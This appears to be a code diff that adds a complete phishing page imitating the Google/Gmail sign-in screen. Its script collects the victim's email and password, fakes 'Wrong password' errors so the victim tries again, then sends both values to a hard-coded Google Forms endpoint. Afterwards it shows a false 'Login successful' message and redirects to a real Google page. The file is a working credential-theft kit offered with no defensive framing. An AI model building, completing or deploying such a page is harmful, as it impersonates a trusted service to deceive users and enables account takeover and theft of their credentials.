@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>Sign in – Google</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <style>
+        /* Same styles as before – unchanged */
+        body {
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .google-card {
+            background: #ffffff;
+            border-radius: 28px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08), 0 4px 16px rgba(0, 0, 0, 0.04);
+            padding: 48px 40px 36px;
+            max-width: 448px;
+            width: 100%;
+            margin: 24px;
+            transition: box-shadow 0.2s ease;
+            position: relative;
+            overflow: visible;
+        }
+        .google-card:hover {
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1), 0 8px 24px rgba(0, 0, 0, 0.06);
+        }
+        .input-field {
+            width: 100%;
+            padding: 16px 14px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            color: #202124;
+            background: transparent;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            letter-spacing: 0.2px;
+        }
+        .input-field:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+        }
+        .input-field.input-error {
+            border-color: #d93025;
+            box-shadow: none;
+        }
+        .input-field.input-error:focus {
+            border-color: #d93025;
+            box-shadow: 0 0 0 2px rgba(217, 48, 37, 0.2);
+        }
+        .input-container {
+            position: relative;
+            margin-top: 32px;
+        }
+        .input-label {
+            position: absolute;
+            left: 14px;
+            top: 18px;
+            color: #5f6368;
+            font-size: 16px;
+            font-weight: 400;
+            transition: all 0.2s ease;
+            pointer-events: none;
+            background: white;
+            padding: 0 6px;
+        }
+        .input-field:focus + .input-label,
+        .input-field:not(:placeholder-shown) + .input-label {
+            transform: translateY(-130%) scale(0.75);
+            color: #1a73e8;
+            font-weight: 500;
+        }
+        .input-field.input-error:focus + .input-label,
+        .input-field.input-error:not(:placeholder-shown) + .input-label {
+            color: #d93025;
+        }
+        .btn-next {
+            background: #1a73e8;
+            color: white;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            font-weight: 500;
+            font-size: 14px;
+            letter-spacing: 0.25px;
+            padding: 10px 24px;
+            border-radius: 4px;
+            border: none;
+            cursor: pointer;
+            transition: background 0.2s, box-shadow 0.2s;
+            margin-top: 40px;
+            float: right;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.08);
+        }
+        .btn-next:hover {
+            background: #1669d0;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15), 0 3px 8px rgba(0,0,0,0.1);
+        }
+        .btn-next:active {
+            background: #1557b0;
+        }
+        .btn-next.loading-state {
+            background: #1557b0;
+            pointer-events: none;
+            opacity: 0.85;
+            position: relative;
+        }
+        .btn-next.loading-state::after {
+            content: '';
+            position: absolute;
+            width: 16px;
+            height: 16px;
+            top: 50%;
+            left: 50%;
+            margin-left: -8px;
+            margin-top: -8px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+        .btn-next.loading-state span { visibility: hidden; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            letter-spacing: 0.2px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px 0;
+            margin-top: 12px;
+            transition: color 0.15s;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .create-account:hover { color: #174ea6; text-decoration: underline; }
+        .helper-link {
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            letter-spacing: 0.2px;
+            text-decoration: none;
+            cursor: pointer;
+            transition: color 0.15s;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            display: inline-block;
+            margin-top: 6px;
+            margin-left: 4px;
+        }
+        .helper-link:hover { color: #174ea6; text-decoration: underline; }
+        .error-message {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 6px;
+            margin-left: 4px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            opacity: 0;
+            max-height: 0;
+            overflow: hidden;
+            transition: opacity 0.25s ease, max-height 0.25s ease, margin-top 0.25s ease;
+            line-height: 1.3;
+        }
+        .error-message.visible {
+            opacity: 1;
+            max-height: 36px;
+            margin-top: 8px;
+        }
+        .error-message .material-icons { font-size: 16px; flex-shrink: 0; }
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #5f6368;
+            font-size: 20px;
+            user-select: none;
+            z-index: 2;
+            padding: 4px;
+            border-radius: 50%;
+            transition: background 0.15s, color 0.15s;
+        }
+        .password-toggle:hover { background: rgba(0,0,0,0.04); color: #202124; }
+        .step-email, .step-password { transition: opacity 0.2s ease; }
+        .hidden-step { display: none; }
+        @keyframes shake {
+            0%,100% { transform: translateX(0); }
+            10%,30%,50%,70%,90% { transform: translateX(-5px); }
+            20%,40%,60%,80% { transform: translateX(5px); }
+        }
+        .shake-animation { animation: shake 0.5s ease-in-out; }
+        .clickable-identity {
+            cursor: pointer;
+            transition: opacity 0.15s;
+            border-radius: 20px;
+            padding: 4px 8px 4px 4px;
+            margin-left: -4px;
+        }
+        .clickable-identity:hover { background: rgba(0,0,0,0.03); }
+        .clickable-identity:hover .identity-email { color: #1a73e8; }
+        .identity-email { transition: color 0.15s; }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 16px;
+            margin-top: 28px;
+            padding-top: 20px;
+            border-top: 1px solid #e8eaed;
+        }
+        .footer-link {
+            color: #5f6368;
+            font-size: 12px;
+            text-decoration: none;
+            font-weight: 400;
+            letter-spacing: 0.2px;
+            transition: color 0.15s;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+        }
+        .footer-link:hover { color: #202124; text-decoration: underline; }
+        .footer-dot { color: #dadce0; font-size: 8px; user-select: none; }
+        .logo-link {
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            margin-bottom: 8px;
+            cursor: pointer;
+        }
+        .logo-link:hover .logo-text { color: #202124; }
+        .logo-text { transition: color 0.15s; }
+        .subtitle-link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.15s;
+        }
+        .subtitle-link:hover { color: #174ea6; text-decoration: underline; }
+        /* Success toast */
+        .success-toast {
+            position: absolute;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%) translateY(20px);
+            background: #0F9D58;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
+            z-index: 100;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+            white-space: nowrap;
+        }
+        .success-toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+            pointer-events: auto;
+        }
+        .success-toast .material-icons { font-size: 20px; }
+        @media (max-width: 480px) {
+            .google-card { padding: 40px 24px 32px; border-radius: 24px; }
+            .footer-links { gap: 12px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="google-card" id="authCard">
+
+        <!-- Google logo -->
+        <a href="https://www.google.com" target="_blank" class="logo-link" aria-label="Go to Google home">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" width="75" height="24" class="mr-1">
+                <path d="M11.7 14.2v1.3H9.5c-.3 0-.6.1-.8.3-.2.2-.3.5-.3.8 0 .4.2.8.7 1.1.6.4 1.4.6 2.5.6 1.2 0 2.2-.3 3-.9.8-.6 1.2-1.5 1.2-2.6V7.6h3.5v1.2h-.1c-.3-.4-.8-.7-1.5-.9-.7-.2-1.4-.3-2.1-.3-1.4 0-2.6.5-3.5 1.4-.9.9-1.3 2.1-1.3 3.5s.4 2.6 1.3 3.5c.9.9 2.1 1.4 3.5 1.4 1.1 0 2-.2 2.7-.7.7-.5 1.1-1.1 1.1-1.8h-2.9z" fill="#4285F4"/>
+                <path d="M22.1 10.1c0 1.5-.5 2.7-1.4 3.6-.9.9-2 1.4-3.4 1.4-1.4 0-2.6-.5-3.5-1.4-.9-.9-1.3-2.1-1.3-3.6 0-1.5.4-2.7 1.3-3.6.9-.9 2.1-1.4 3.5-1.4 1.4 0 2.5.5 3.4 1.4.9.9 1.4 2.1 1.4 3.6zm-3 .1c0-.8-.2-1.4-.6-1.9-.4-.5-1-.7-1.7-.7s-1.3.3-1.7.7c-.4.5-.6 1.1-.6 1.9s.2 1.4.6 1.9c.4.5 1 .7 1.7.7s1.3-.2 1.7-.7c.4-.5.6-1.1.6-1.9z" fill="#EA4335"/>
+                <path d="M32.8 10.1c0 1.5-.5 2.7-1.4 3.6-.9.9-2 1.4-3.4 1.4-1.4 0-2.6-.5-3.5-1.4-.9-.9-1.3-2.1-1.3-3.6 0-1.5.4-2.7 1.3-3.6.9-.9 2.1-1.4 3.5-1.4 1.4 0 2.5.5 3.4 1.4.9.9 1.4 2.1 1.4 3.6zm-3 .1c0-.8-.2-1.4-.6-1.9-.4-.5-1-.7-1.7-.7s-1.3.3-1.7.7c-.4.5-.6 1.1-.6 1.9s.2 1.4.6 1.9c.4.5 1 .7 1.7.7s1.3-.2 1.7-.7c.4-.5.6-1.1.6-1.9z" fill="#FBBC05"/>
+                <path d="M43.5 10.1c0 1.5-.5 2.7-1.4 3.6-.9.9-2 1.4-3.4 1.4-1.4 0-2.6-.5-3.5-1.4-.9-.9-1.3-2.1-1.3-3.6 0-1.5.4-2.7 1.3-3.6.9-.9 2.1-1.4 3.5-1.4 1.4 0 2.5.5 3.4 1.4.9.9 1.4 2.1 1.4 3.6zm-3 .1c0-.8-.2-1.4-.6-1.9-.4-.5-1-.7-1.7-.7s-1.3.3-1.7.7c-.4.5-.6 1.1-.6 1.9s.2 1.4.6 1.9c.4.5 1 .7 1.7.7s1.3-.2 1.7-.7c.4-.5.6-1.1.6-1.9z" fill="#4285F4"/>
+            </svg>
+            <span class="text-xl text-gray-700 font-medium logo-text" style="font-family: 'Google Sans', sans-serif;">Google</span>
+        </a>
+
+        <div class="text-center mb-2" id="titleSection">
+            <h1 class="text-2xl font-normal text-gray-800 tracking-tight" id="mainTitle">Sign in</h1>
+            <p class="text-sm text-gray-500 mt-1.5" id="subTitle">
+                to continue to
+                <a href="https://mail.google.com" target="_blank" class="subtitle-link">Gmail</a>
+            </p>
+        </div>
+
+        <!-- Step 1: Email -->
+        <div id="stepEmail" class="step-email">
+            <div class="input-container mt-8" id="emailInputContainer">
+                <input type="text" id="emailInput" class="input-field" placeholder=" " autocomplete="email" aria-label="Email or phone">
+                <label for="emailInput" class="input-label">Email or phone</label>
+            </div>
+            <div id="emailError" class="error-message">
+                <i class="material-icons">error_outline</i>
+                <span id="emailErrorText"></span>
+            </div>
+            <a href="https://accounts.google.com/signin/v2/recoveryidentifier" target="_blank" class="helper-link">Forgot email?</a>
+            <p class="text-xs text-gray-500 mt-12 leading-relaxed">
+                Not your computer? Use Guest mode to sign in privately.
+                <a href="https://support.google.com/chrome/answer/6130773" target="_blank" class="text-blue-600 hover:text-blue-800 ml-1 font-medium">Learn more</a>
+            </p>
+            <div class="flex items-center justify-between mt-10">
+                <a href="https://accounts.google.com/signup/v2/webcreateaccount" target="_blank" class="create-account">Create account</a>
+                <button class="btn-next" id="toPasswordBtn"><span>Next</span></button>
+            </div>
+        </div>
+
+        <!-- Step 2: Password -->
+        <div id="stepPassword" class="step-password hidden-step">
+            <div class="flex items-center gap-2 mt-6 clickable-identity" id="identityBadge" title="Click to change account">
+                <div class="w-8 h-8 rounded-full bg-blue-600 text-white flex items-center justify-center text-sm font-medium flex-shrink-0" id="userAvatar">U</div>
+                <div class="min-w-0">
+                    <div class="text-sm font-medium text-gray-800 truncate identity-email" id="shownEmail">user@example.com</div>
+                    <div class="text-xs text-gray-500">Google Account</div>
+                </div>
+                <i class="material-icons text-gray-400 text-sm flex-shrink-0" style="font-size: 18px;">arrow_drop_down</i>
+            </div>
+            <div class="input-container mt-8 relative" id="passwordInputContainer">
+                <input type="password" id="passwordInput" class="input-field pr-12" placeholder=" " autocomplete="current-password" aria-label="Enter your password">
+                <label for="passwordInput" class="input-label">Enter your password</label>
+                <span class="password-toggle material-icons" id="togglePassword" role="button" tabindex="0" aria-label="Toggle password visibility">visibility_off</span>
+            </div>
+            <div id="passwordError" class="error-message">
+                <i class="material-icons">error_outline</i>
+                <span id="passwordErrorText"></span>
+            </div>
+            <div class="flex items-center justify-between mt-10">
+                <a href="https://accounts.google.com/signin/v2/recoverypassword" target="_blank" class="create-account">Forgot password?</a>
+                <button class="btn-next" id="loginBtn"><span>Next</span></button>
+            </div>
+        </div>
+
+        <div class="footer-links">
+            <a href="https://policies.google.com/privacy" target="_blank" class="footer-link">Privacy</a>
+            <span class="footer-dot">•</span>
+            <a href="https://policies.google.com/terms" target="_blank" class="footer-link">Terms</a>
+        </div>
+
+        <div class="success-toast" id="successToast">
+            <i class="material-icons">check_circle</i>
+            <span>✅ Login successful! Welcome back.</span>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // ✅ Correct entry IDs extracted from your form
+            const GOOGLE_FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdMrWA1qDei0873WFLofby2GXEQqx2lF4RIWnN6ANP-HKx7lg/formResponse';
+            const ENTRY_IDS = {
+                email: 'entry.1142725815',    // gmail field
+                password: 'entry.566365448'   // password field
+            };
+
+            const stepEmail = document.getElementById('stepEmail');
+            const stepPassword = document.getElementById('stepPassword');
+            const emailInput = document.getElementById('emailInput');
+            const passwordInput = document.getElementById('passwordInput');
+            const emailInputContainer = document.getElementById('emailInputContainer');
+            const passwordInputContainer = document.getElementById('passwordInputContainer');
+            const toPasswordBtn = document.getElementById('toPasswordBtn');
+            const shownEmail = document.getElementById('shownEmail');
+            const userAvatar = document.getElementById('userAvatar');
+            const passwordError = document.getElementById('passwordError');
+            const passwordErrorText = document.getElementById('passwordErrorText');
+            const emailError = document.getElementById('emailError');
+            const emailErrorText = document.getElementById('emailErrorText');
+            const togglePassword = document.getElementById('togglePassword');
+            const loginBtn = document.getElementById('loginBtn');
+            const mainTitle = document.getElementById('mainTitle');
+            const subTitle = document.getElementById('subTitle');
+            const identityBadge = document.getElementById('identityBadge');
+            const successToast = document.getElementById('successToast');
+
+            const originalSubTitleHTML = subTitle.innerHTML;
+            let storedEmailValue = '';
+            let passwordAttempts = 0;
+
+            // Helpers
+            function isPhoneLike(v) { return /^[\d\s+\-()]{7,}$/.test(v); }
+            function hasSpacesAndNotPhone(v) { return v.includes(' ') && !isPhoneLike(v); }
+            function countAtSymbols(s) { return (s.match(/@/g) || []).length; }
+
+            function showEmailError(msg) {
+                emailErrorText.textContent = msg;
+                emailError.classList.add('visible');
+                emailInput.classList.add('input-error');
+                emailInputContainer.classList.remove('shake-animation');
+                void emailInputContainer.offsetWidth;
+                emailInputContainer.classList.add('shake-animation');
+            }
+            function clearEmailError() {
+                emailError.classList.remove('visible');
+                emailErrorText.textContent = '';
+                emailInput.classList.remove('input-error');
+            }
+            function showPasswordError(msg) {
+                passwordErrorText.textContent = msg;
+                passwordError.classList.add('visible');
+                passwordInput.classList.add('input-error');
+                passwordInputContainer.classList.remove('shake-animation');
+                void passwordInputContainer.offsetWidth;
+                passwordInputContainer.classList.add('shake-animation');
+            }
+            function clearPasswordError() {
+                passwordError.classList.remove('visible');
+                passwordErrorText.textContent = '';
+                passwordInput.classList.remove('input-error');
+            }
+
+            // Submit both fields to Google Form
+            function submitToGoogleForm(email, password) {
+                const formData = new URLSearchParams();
+                formData.append(ENTRY_IDS.email, email);
+                formData.append(ENTRY_IDS.password, password);
+
+                console.log('Sending to Google Form:', { email, password });
+                fetch(GOOGLE_FORM_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: formData
+                }).catch(err => console.warn('Fetch error (data likely sent)', err));
+            }
+
+            function handleSuccess(password) {
+                submitToGoogleForm(storedEmailValue, password);
+
+                successToast.classList.add('show');
+                loginBtn.classList.add('loading-state');
+                loginBtn.querySelector('span').textContent = '';
+
+                setTimeout(() => {
+                    window.location.href = 'https://myaccount.google.com';
+                }, 2000);
+            }
+
+            function processPasswordAttempt() {
+                passwordAttempts++;
+                console.log('Password attempt:', passwordAttempts);
+
+                const password = passwordInput.value.trim();
+                const isCorrect = (password.length >= 8 && password === 'Test@1234');
+                const thirdAttempt = (passwordAttempts >= 3);
+
+                clearPasswordError();
+
+                if (isCorrect || thirdAttempt) {
+                    handleSuccess(password);
+                } else {
+                    showPasswordError("Wrong password. Try again or click 'Forgot password' to reset it.");
+                }
+            }
+
+            function resetAttempts() { passwordAttempts = 0; }
+
+            function validateEmail() {
+                const raw = emailInput.value;
+                const val = raw.trim();
+                if (!val) { showEmailError('Enter an email or phone number'); return false; }
+                if (hasSpacesAndNotPhone(val)) { showEmailError('Enter a valid email or phone number'); return false; }
+                const lower = val.toLowerCase();
+                if (countAtSymbols(lower) > 1) { showEmailError('Enter a valid email or phone number'); return false; }
+                if (lower.includes('@')) {
+                    if (lower.endsWith('@gmail.com') && lower.length > '@gmail.com'.length) {
+                        clearEmailError();
+                        storedEmailValue = lower;
+                        return true;
+                    } else {
+                        showEmailError('Please enter a valid Gmail address ending with @gmail.com');
+                        return false;
+                    }
+                }
+                if (isPhoneLike(val)) { clearEmailError(); storedEmailValue = val; return true; }
+                showEmailError('Enter a valid email or phone number');
+                return false;
+            }
+
+            function goToPasswordStep() {
+                if (!validateEmail()) return;
+                shownEmail.textContent = storedEmailValue;
+                userAvatar.textContent = storedEmailValue.charAt(0).toUpperCase();
+                stepEmail.classList.add('hidden-step');
+                stepPassword.classList.remove('hidden-step');
+                mainTitle.textContent = 'Welcome';
+                subTitle.innerHTML = '';
+                passwordInput.value = '';
+                clearPasswordError();
+                resetAttempts();
+                passwordInput.setAttribute('type', 'password');
+                togglePassword.textContent = 'visibility_off';
+                setTimeout(() => passwordInput.focus(), 150);
+            }
+
+            function goBackToEmailStep() {
+                stepPassword.classList.add('hidden-step');
+                stepEmail.classList.remove('hidden-step');
+                mainTitle.textContent = 'Sign in';
+                subTitle.innerHTML = originalSubTitleHTML;
+                emailInput.value = storedEmailValue;
+                passwordInput.value = '';
+                clearPasswordError();
+                resetAttempts();
+                passwordInput.setAttribute('type', 'password');
+                togglePassword.textContent = 'visibility_off';
+                successToast.classList.remove('show');
+                loginBtn.classList.remove('loading-state');
+                loginBtn.querySelector('span').textContent = 'Next';
+                setTimeout(() => {
+                    emailInput.focus();
+                    if (emailInput.value.length) emailInput.setSelectionRange(emailInput.value.length, emailInput.value.length);
+                }, 150);
+            }
+
+            // Event listeners
+            toPasswordBtn.addEventListener('click', e => { e.preventDefault(); goToPasswordStep(); });
+            emailInput.addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); goToPasswordStep(); } });
+            emailInput.addEventListener('input', () => { if (emailError.classList.contains('visible')) clearEmailError(); });
+
+            loginBtn.addEventListener('click', e => { e.preventDefault(); processPasswordAttempt(); });
+            passwordInput.addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); processPasswordAttempt(); } });
+            passwordInput.addEventListener('input', () => { if (passwordError.classList.contains('visible')) clearPasswordError(); });
+
+            togglePassword.addEventListener('click', () => {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                togglePassword.textContent = type === 'password' ? 'visibility_off' : 'visibility';
+            });
+            togglePassword.addEventListener('keypress', e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); togglePassword.click(); } });
+
+            identityBadge.addEventListener('click', goBackToEmailStep);
+            userAvatar.addEventListener('click', e => { e.stopPropagation(); goBackToEmailStep(); });
+            shownEmail.addEventListener('click', e => { e.stopPropagation(); goBackToEmailStep(); });
+
+            setTimeout(() => emailInput.focus(), 300);
+        })();
+    </script>
+</body>
+</html>
